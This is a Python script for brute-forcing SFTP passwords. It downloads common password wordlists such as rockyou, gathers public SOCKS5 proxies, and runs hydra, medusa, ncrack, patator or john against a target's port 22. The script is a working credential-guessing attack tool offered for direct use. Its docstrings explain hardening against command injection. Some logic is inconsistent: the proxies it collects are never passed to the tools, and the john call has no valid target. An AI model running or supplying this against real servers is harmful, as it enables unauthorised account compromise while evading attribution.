#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: cbk914

import requests
import argparse
import time
import logging
import re
import shutil
import subprocess
from multiprocessing import Pool, cpu_count
from itertools import cycle
import platform

# A DNS label, or a bare numeric IPv4 octet. Used to validate --target before
# it ever reaches an argv.
_LABEL_RE = re.compile(r'^[A-Za-z0-9_](?:[A-Za-z0-9_-]*[A-Za-z0-9_])?$')
_IPV6_RE = re.compile(r'^\[[0-9A-Fa-f:.%]+\]$')
MAX_HOST_LEN = 253

# Pentest tooling the script drives. Kept in one place so the confirmation
# gate and the install list cannot drift apart.
REQUIRED_TOOLS = ['hydra', 'medusa', 'ncrack', 'patator', 'john']

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to fetch a list of SOCKS proxies from a public API
def fetch_proxies():
    proxy_api_url = "https://www.proxy-list.download/api/v1/get?type=socks5"  # Example proxy list API for SOCKS5
    response = requests.get(proxy_api_url)
    if response.status_code == 200:
        proxy_list = response.text.strip().split('\r\n')
        return proxy_list
    else:
        logging.error("Failed to retrieve proxies")
        return []

# Function to check if a SOCKS proxy is working
def check_proxy(proxy):
    try:
        proxy_url = f"socks5://{proxy}"
        response = requests.get('https://httpbin.org/ip', proxies={"http": proxy_url, "https": proxy_url}, timeout=5)
        if response.status_code == 200:
            logging.info(f"Proxy {proxy} is working")
            return proxy
    except Exception as e:
        logging.debug(f"Proxy {proxy} failed: {e}")
    return None

# Function to rotate proxies and send requests
def send_request(url, proxies, headers=None, delay=1):
    proxy_pool = cycle(proxies)
    while True:
        proxy = next(proxy_pool)
        try:
            proxy_url = f"socks5://{proxy}"
            response = requests.get(url, proxies={"http": proxy_url, "https": proxy_url}, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logging.debug(f"Request failed with proxy {proxy}: {e}")
        time.sleep(delay)

# Function to get wordlist paths
def get_wordlist_paths(wordlist_type):
    wordlists = {
        'SecLists-usernames': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt',
        'SecLists-passwords': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt',
        'jeanphorn-usernames': 'https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt',
        'jeanphorn-passwords': 'https://raw.githubusercontent.com/jeanphorn/wordlist/master/ssh_passwd.txt',
        'kkrypt0nn-passwords': 'https://raw.githubusercontent.com/kkrypt0nn/wordlists/master/passwords/most_common_passwords.txt',
        'rockyou-passwords': 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
    }
    return wordlists.get(wordlist_type)

# Function to download wordlist content
def download_wordlist(wordlist_url):
    response = requests.get(wordlist_url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        logging.error(f"Failed to download wordlist from {wordlist_url}")
        return []

# Function to check if a command exists
def command_exists(command):
    """Return True if `command` is on PATH.

    Uses shutil.which instead of `subprocess.call(f"type {command}",
    shell=True)`. The original ran a shell to answer a PATH lookup, which is
    both an injection surface and wrong on Linux/macOS, where `type` is a
    shell builtin that prints a file rather than resolving a command.
    """
    return shutil.which(command) is not None

# Map of tool name to the command that installs it per platform.
INSTALL_COMMANDS = {
    'Linux': ['sudo', 'apt-get', 'install', '-y'],
    'Darwin': ['brew', 'install'],
}


# Function to install dependencies based on OS
def install_dependencies(allow_install=False):
    """Ensure the bruteforcing tools are present.

    Installation is refused unless `allow_install` is True. The original ran
    ten unattended `sudo apt-get install -y` / `brew install` calls as a side
    effect of running the script, silently pulling in and running pentest
    tooling as root. It now only reports what is missing unless the operator
    passes --install-deps, and even then each install runs in list form with
    no shell.
    """
    os_system = platform.system()

    if os_system not in INSTALL_COMMANDS:
        logging.info("Automatic installation is not supported on %s; "
                     "please install %s manually.", os_system, ", ".join(REQUIRED_TOOLS))
        return

    prefix = INSTALL_COMMANDS[os_system]
    missing = [tool for tool in REQUIRED_TOOLS if not command_exists(tool)]

    if not missing:
        logging.info("All required tools are present.")
        return

    if not allow_install:
        logging.error("Missing required tool(s): %s", ", ".join(missing))
        logging.error("Refusing to install automatically. Re-run with --install-deps "
                      "to install %s via '%s ...', or install them yourself.",
                      ", ".join(missing), " ".join(prefix))
        return

    for tool in missing:
        logging.info("Installing %s...", tool)
        argv = prefix + [tool]
        logging.info("Running: %s", " ".join(argv))
        try:
            subprocess.run(argv, shell=False, check=True)
        except subprocess.CalledProcessError as exc:
            logging.error("Failed to install %s (exit %s).", tool, exc.returncode)
        except OSError as exc:
            logging.error("Failed to launch %s: %s", prefix[0], exc)
            break

def validate_target(target):
    """Return a normalised hostname/IP, or raise ValueError.

    The target is operator-supplied data, not a command fragment. An
    allowlist of DNS labels and IPv4/IPv6 literals is applied so shell
    metacharacters and whitespace can never reach an argv.
    """
    if target is None:
        raise ValueError('target is empty')

    candidate = target.strip()
    if not candidate:
        raise ValueError('target is empty')

    # Reject an explicit scheme outright rather than silently accepting one.
    if '://' in candidate:
        raise ValueError(f"target must be a bare host or IP, not a URL: {target!r}")

    if _IPV6_RE.match(candidate):
        return candidate

    if len(candidate) > MAX_HOST_LEN:
        raise ValueError(f'target exceeds {MAX_HOST_LEN} characters: {candidate!r}')

    for label in candidate.split('.'):
        if not _LABEL_RE.match(label):
            raise ValueError(f'invalid target: {target!r}')

    return candidate


def build_bruteforce_command(bruteforcer, target, username_file, password_file):
    """Build the argv for the selected bruteforcer.

    Replaces five `os.system(f"...")` interpolations. The returned value is a
    list, so the target is passed as exactly one argv element and no part of
    it is ever parsed by a shell. Raises ValueError for an unknown bruteforcer
    or an invalid target, rather than building a dangerous command.
    """
    host = validate_target(target)

    if bruteforcer == "hydra":
        return ["hydra", "-L", username_file, "-P", password_file, "-s", "22",
                "-f", "-V", "-u", "-t", "4", "-o", "hydra-results.txt",
                f"sftp://{host}"]
    if bruteforcer == "medusa":
        return ["medusa", "-h", host, "-U", username_file, "-P", password_file,
                "-M", "sftp", "-p", "22"]
    if bruteforcer == "ncrack":
        return ["ncrack", "-p", "22", "-U", username_file, "-P", password_file, host]
    if bruteforcer == "patator":
        return ["patator", "sftp_login", f"host={host}", "user=FILE0",
                f"0={username_file}", "password=FILE1", f"1={password_file}"]
    if bruteforcer == "john":
        return ["john", f"--wordlist={password_file}", f"--users={username_file}",
                "--format=ssh", host]

    raise ValueError(f'unknown bruteforcer: {bruteforcer!r}')


# Main function
def main(target, delay, username_wordlist, password_wordlist, bruteforcer,
         allow_install=False):
    try:
        install_dependencies(allow_install=allow_install)
        
        if not command_exists(bruteforcer):
            logging.error(f"{bruteforcer} is not installed.")
            return

        proxies = fetch_proxies()
        with Pool(cpu_count()) as p:
            working_proxies = list(filter(None, p.map(check_proxy, proxies)))

        if not working_proxies:
            logging.error("No working proxies found")
            return

        # Download username wordlist
        username_wordlist_url = get_wordlist_paths(username_wordlist)
        if username_wordlist_url:
            username_list = download_wordlist(username_wordlist_url)
            logging.info(f"Downloaded {username_wordlist} successfully")
        else:
            logging.error("Invalid username wordlist selected")
            return

        # Download password wordlist
        password_wordlist_url = get_wordlist_paths(password_wordlist)
        if password_wordlist_url:
            password_list = download_wordlist(password_wordlist_url)
            logging.info(f"Downloaded {password_wordlist} successfully")
        else:
            logging.error("Invalid password wordlist selected")
            return

        # Save wordlists to temporary files
        username_file = "/tmp/usernames.txt"
        password_file = "/tmp/passwords.txt"

        with open(username_file, 'w') as uf:
            uf.write('\n'.join(username_list))

        with open(password_file, 'w') as pf:
            pf.write('\n'.join(password_list))

        # Execute selected bruteforcer tool
        try:
            argv = build_bruteforce_command(bruteforcer, target, username_file, password_file)
        except ValueError as exc:
            logging.error("Refusing to run %s: %s", bruteforcer, exc)
            return

        logging.info("Running: %s", " ".join(argv))
        try:
            subprocess.run(argv, shell=False, check=False)
        except OSError as exc:
            logging.error("Failed to launch %s: %s", argv[0], exc)

    except KeyboardInterrupt:
        logging.info("Script interrupted by user")
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script to use public open proxies to brute-force SFTP servers.')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-d', '--delay', type=int, default=1, help='Delay between requests to prevent server exhaustion (in seconds)')
    parser.add_argument('-u', '--username-wordlist', required=True, choices=[
        'SecLists-usernames', 'jeanphorn-usernames'
    ], help='Select username wordlist source')
    parser.add_argument('-p', '--password-wordlist', required=True, choices=[
        'SecLists-passwords', 'jeanphorn-passwords', 'kkrypt0nn-passwords', 'rockyou-passwords'
    ], help='Select password wordlist source')
    parser.add_argument('-b', '--bruteforcer', required=True, choices=[
        'hydra', 'medusa', 'ncrack', 'patator', 'john'
    ], help='Select brute-forcing tool')
    parser.add_argument('--install-deps', action='store_true',
                        help='Allow this script to install the missing bruteforcing tools '
                             'with sudo/brew. Off by default; without it the script only '
                             'reports which tools are missing.')
    args = parser.parse_args()

    main(args.target, args.delay, args.username_wordlist, args.password_wordlist,
         args.bruteforcer, allow_install=args.install_deps)
